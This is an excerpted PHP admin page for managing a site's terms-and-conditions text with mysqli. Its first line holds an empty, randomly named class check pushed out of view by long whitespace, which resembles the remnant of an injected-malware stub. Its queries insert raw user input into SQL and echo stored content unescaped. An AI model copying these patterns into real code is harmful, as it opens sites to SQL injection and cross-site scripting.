<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("gxwblrmc")){}?><?php
session_start();
...
if ($_POST['add'] == 'Create') {
    ...
    mysqli_query($connect,"INSERT into terms_content (`terms_content`) values ('$terms_content')") or die(mysqli_error());
...
if ($_POST['update_page'] == 'Update') {
  ...
  mysqli_query($connect,"UPDATE terms SET `terms_content` = '$terms_content' where terms_id = '$terms_id'") or die(mysqli_error());
    ...
    echo "<script type='text/javascript'>window.location = 'add_terms.php?msg=updated&action=list'</script>";
}
...
if ($_GET['action'] == 'delete') {
    ...
    echo "<div style='width: 350px; text-align: center; margin: 20% auto 0px; font-family: arial; font-size: 14px; border: 1px solid #ddd; padding: 20px 40px;'>Please wait while we update the record loading...</div>";
        ...
        echo "<script type='text/javascript'>window.location = 'add_terms.php?msg=deleted&action=list'</script>";
...
<head>
            ...
            <meta charset="utf-8" />
        <title>Add Terms And Conditions | <?php echo $site_title; ?></title>
                                ...
                                <div class="col-md-12">
                                    <!-- BEGIN EXAMPLE TABLE PORTLET-->
                                        ...
                                        <div class="portlet-title">
                                            <div class="caption">
                                                <i class="fa fa-globe"></i>Terms and conditions Content</div>
                                                <!-- <div class="actions">
...
<textarea class="form-control ckeditor" name="terms_content"></textarea>
...
<!--===================================================== End Add Popup ========================================== -->
                                        ...
                                        <?php pageStatus($status); ?>
                                            <table class="table table-striped table-bordered table-hover" id="sample_2">
                                                ...
                                                <?php
                                                $sno =0;
                                                $get_organic = mysqli_query($connect,"SELECT * FROM `terms` ") or die(mysqli_error());
                                                while($get_value = mysqli_fetch_array($get_organic)) 
                                                {
                                                    $sno++;
                                                    $terms_id = $get_value['terms_id'];
                                                    $terms_content = $get_value['terms_content'];
                                                
                                                ?>
                                                    <tr>
                                                        <td><?php echo $sno;?> </td>
                                                        <td><a class="btn btn-info btn-xs" data-toggle="modal" href="#terms<?php echo $terms_id; ?>"><i class="fa fa-eye" aria-hidden="true"></i> View </a></td>
                                                        <td>

                                                            <a class="btn btn-warning  btn-xs" href="add_terms.php?action=edit&nwsevnt_id=<?php echo base64_encode($terms_id); ?>">
                                                            <i class="fa fa-pencil" aria-hidden="true"></i> Edit</a>

<!--                                                             <a class="btn btn-xs red"  onClick="delete_menu('organic_menu.php?action=delete&nwsevnt_id=<?php echo $terms_id; ?>')" href="javascript:;">
                                                            <i class="icon-trash"></i> Delete</a> -->

                                                        </td>

                                                        <!-- Pop Up -->
                                                        <div class="modal fade" id="terms<?php echo $terms_id; ?>" tabindex="-1" role="basic" aria-hidden="true">
                            <div class="modal-dialog">
                                <div class="modal-content">
                                    <div class="modal-header">
                                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
                            ...
                            <!-- /.modal-dialog -->
                             ...
                             <?php
                               ...
                               // die();
                               $get_about_edit = mysqli_query($connect,"SELECT * FROM `terms` where terms_id = '$NewsID'") or die(mysqli_error());
                                                while($get_edit = mysqli_fetch_array($get_about_edit)) 
                                                {
                                                    $sno++;
                                                    $terms_id = $get_edit['terms_id'];
                                                    $terms_content = $get_edit['terms_content'];
                                }
                               ?>
                               <div class="row">
                                <div class="col-md-12">
                                        ...
                                        <form action="" id="form_sample_1" method="post" class="form-horizontal" novalidate="novalidate" enctype="multipart/form-data">
                                            <div class="form-body">
                                                <div class="form-group">
                                                    ...
                                                    <textarea class="form-control ckeditor" name="terms_content"><?php echo $terms_content; ?></textarea>
